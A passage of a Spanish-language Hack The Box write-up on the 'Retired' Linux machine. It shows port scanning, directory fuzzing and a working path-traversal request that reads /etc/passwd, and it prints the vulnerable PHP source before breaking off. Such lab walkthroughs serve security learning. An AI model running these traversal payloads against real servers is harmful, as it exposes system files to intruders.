<!doctype html><html lang="es"><head><title>Retired | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. M谩quina media. Esta m谩quina tiene una p谩gina web en PHP que es vulnerable a navegaci贸n de directorios. Aqu铆 encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simb贸licos. Y luego, se nos permite a帽adir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta m谩quina se necesitan t茅cnicas s贸lidas de explotaci贸n de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusi贸n"><meta itemprop="description" content="Hack The Box. Linux. M谩quina media. Esta m谩quina tiene una p谩gina web en PHP que es vulnerable a navegaci贸n de directorios. Aqu铆 encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simb贸licos. Y luego, se nos permite a帽adir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta m谩quina se necesitan t茅cnicas s贸lidas de explotaci贸n de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusi贸n"><meta name="twitter:card" content="Hack The Box. Linux. M谩quina media. Esta m谩quina tiene una p谩gina web en PHP que es vulnerable a navegaci贸n de directorios. Aqu铆 encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simb贸licos. Y luego, se nos permite a帽adir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta m谩quina se necesitan t茅cnicas s贸lidas de explotaci贸n de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusi贸n"><meta name="twitter:description" content="Hack The Box. Linux. M谩quina media. Esta m谩quina tiene una p谩gina web en PHP que es vulnerable a navegaci贸n de directorios. Aqu铆 encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simb贸licos. Y luego, se nos permite a帽adir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta m谩quina se necesitan t茅cnicas s贸lidas de explotaci贸n de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusi贸n"><meta property="og:description" content="Hack The Box. Linux. M谩quina media. Esta m谩quina tiene una p谩gina web en PHP que es vulnerable a navegaci贸n de directorios. Aqu铆 encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simb贸licos. Y luego, se nos permite a帽adir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta m谩quina se necesitan t茅cnicas s贸lidas de explotaci贸n de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusi贸n"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Retired/Retired.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Retired/Retired.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Retired/Retired.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Retired"><meta property="twitter:title" content="Retired"><meta property="og:title" content="Retired"><meta property="og:url" content="https://7rocky.github.io/htb/retired/"><meta itemprop="keywords" content="php,capabilities,cronjob,buffer-overflow,file-upload,symlinks,binary-exploitation,directory-path-traversal,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><div style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script>
<link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/retired/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/retired/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/retired/&text=Retired" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/retired/&title=Retired" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Retired</h1><time class="mt4 f6 dib tracked" datetime="2022-08-13T00:00:00+01:00">13 / 08 / 2022</time><br><p class="mb4 f6 dib tracked">22 minutos de lectura</p></header><div class="htb-image"><img alt="Retired" src="/images/HTB/Retired/Retired.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/capabilities" title="Capabilities">Capabilities</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/buffer-overflow" title="Buffer Overflow">Buffer Overflow</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/symlinks" title="Enlaces simb贸licos">Enlaces simb贸licos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/binary-exploitation" title="Explotaci贸n de binarios">Explotaci贸n de binarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegaci贸n de directorios">Navegaci贸n de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecuci贸n remota de comandos">Ejecuci贸n remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></a></li><li><a href="#an谩lisis-de-un-binario">An谩lisis de un binario</a></li><li><a href="#preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li></ul></li><li><a href="#enumeraci贸n-del-sistema">Enumeraci贸n del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-dev">Movimiento lateral al usuario <code>dev</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#an谩lisis-de-la-rom">An谩lisis de la ROM</a></li><li><a href="#exploitaci贸n-de-binfmt_misc">Exploitaci贸n de <code>binfmt_misc</code></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Direcci贸n IP</strong>: 10.10.11.154</li><li><strong>Fecha</strong>: 02 / 04 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.154 -p 22,80
Nmap scan report for 10.10.11.154
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 8.11 seconds
</code></pre></div><p>La m谩quina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeraci贸n">Enumeraci贸n</h2><p>Si vamos a <code>http://10.10.11.154</code>, veremos una p谩gina como esta:</p><p><img src="/images/HTB/Retired/Retired-default.png" alt="Retired default"></p><p>Solamente muestra un poco de informaci贸n sobre algo llamado EMUEMU y OSTRICH. Ni idea a煤n.</p><p>Vamos a aplicar <em>fuzzing</em> para enumerar m谩s rutas. N贸tese que estoy usando extensiones <code>.php</code> y <code>.html</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.154/FUZZ -e .php,.html  
<span class="code-dark-blue">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms]</span>
<span class="code-dark-green">default.html            [Status: 200, Size: 11414, Words: 4081, Lines: 189, Duration: 39ms]</span>
<span class="code-dark-blue">assets                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 39ms]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 40ms]</span>
<span class="code-dark-green">beta.html               [Status: 200, Size: 4144, Words: 1137, Lines: 73, Duration: 71ms]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 42ms]</span>
<span class="code-dark-blue">                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]</span>
</code></pre></div><p>Genial, tenemos <code>beta.html</code>. Vamos a ver qu茅 hay:</p><p><img src="/images/HTB/Retired/Retired-beta.png" alt="Retired login"></p><p>Podemos subir un archivo de licencia, y deber铆a tener 512 bits. No hay m谩s informaci贸n sobre esto. Si tratamos de subir algo, la respuesta del servidor est谩 vac铆a, y da igual lo que subamos, no hay respuesta.</p><p>El formulario se env铆a a <code>activate_license.php</code>:</p><p><img src="/images/HTB/Retired/Retired-beta-upload.png" alt="Retired login"></p><h2 id="acceso-a-la-m谩quina">Acceso a la m谩quina</h2><p>Como el <code>index.php</code> acepta un par谩metro llamado <code>page</code>, pide a gritos introducir <em>payloads</em> de tipo <em>Local File Inclusion</em> o <em>Directory Path Traversal</em>. Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/etc/passwd'</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
</code></pre></div><p>Genial, tenemos una vulnerabilidad de <em>Directory Path Traversal</em> (ya que el archivo solamente se lee, no se ejecuta).</p><h3 id="explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></h3><p>Vamos a ver el c贸digo fuente en PHP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=index.php'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk7 mtki">function</span> <span class="mtk8">sanitize_input</span><span class="mtk1">($param)</span> <span class="mtk1">{</span>
    <span class="mtk1">$param1</span> <span class="mtk5">=</span> <span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk4">"../"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">,</span> <span class="mtk1">$param);</span>
    <span class="mtk1">$param2</span> <span class="mtk5">=</span> <span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk4">"./"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">,</span> <span class="mtk1">$param1);</span>
    <span class="mtk5">return</span> <span class="mtk1">$param2;</span>
<span class="mtk1">}</span>

<span class="mtk1">$page</span> <span class="mtk5">=</span> <span class="mtk1">$_GET[</span><span class="mtk4">'page'</span><span class="mtk1">];</span>
<span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($page)</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"/</span><span class="mtk5">^</span><span class="mtk4">[a-z]/"</span><span class="mtk1">,</span> <span class="mtk1">$page))</span> <span class="mtk1">{</span>  
    <span class="mtk1">$page</span> <span class="mtk5">=</span> <span class="mtk8">sanitize_input</span><span class="mtk1">($page);</span>
<span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">'Location:</span> <span class="mtk4">/index.php?page=default.html'</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7">readfile</span><span class="mtk1">($page);</span>
</code></pre></div><p>Una cosa que podemos ver es que el navegador aplicar谩 una redirecci贸n a <code>index.php?page=default.html</code>, por lo que no notaremos que el archivo se renderiza en la respuesta. Como <code>curl</code> no hace la redirecci贸n por defect, podemos leer la respuesta incluso si contiene una redirecci贸n.</p><p>Ahora vamos a ver c贸mo se gestiona la subida del archivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=activate_license.php'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">]))</span> <span class="mtk1">{</span>
    <span class="mtk1">$license</span>      <span class="mtk5">=</span> <span class="mtk7">file_get_contents</span><span class="mtk1">($_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">][</span><span class="mtk4">'tmp_name'</span><span class="mtk1">]);</span>
    <span class="mtk1">$license_size</span> <span class="mtk5">=</span> <span class="mtk1">$_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">][</span><span class="mtk4">'size'</span><span class="mtk1">];</span>

    <span class="mtk1">$socket</span> <span class="mtk5">=</span> <span class="mtk7">socket_create</span><span class="mtk1">(</span><span class="mtk6">AF_INET</span><span class="mtk1">,</span> <span class="mtk6">SOCK_STREAM</span><span class="mtk1">,</span> <span class="mtk6">SOL_TCP</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">$socket)</span> <span class="mtk1">{</span> <span class="mtk7">echo</span> <span class="mtk4">"error</span> <span class="mtk4">socket_create()</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span> <span class="mtk1">}</span>

    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">socket_connect</span><span class="mtk1">($socket,</span> <span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span> <span class="mtk6">1337</span><span class="mtk1">))</span> <span class="mtk1">{</span>
